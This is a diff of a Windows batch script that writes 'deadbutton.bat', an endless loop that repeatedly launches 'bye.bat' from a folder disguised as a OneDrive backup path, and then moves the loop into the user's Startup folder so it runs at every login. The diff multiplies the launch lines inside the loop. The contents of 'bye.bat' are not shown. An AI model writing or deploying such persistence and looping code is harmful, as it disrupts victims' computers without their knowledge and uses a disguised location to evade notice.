@@ -31,6 +31,18 @@ move "bye.bat" "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\"
 echo @echo off > deadbutton.bat
 echo :loop >> deadbutton.bat
 echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
 echo goto :loop >> deadbutton.bat
 move "deadbutton.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
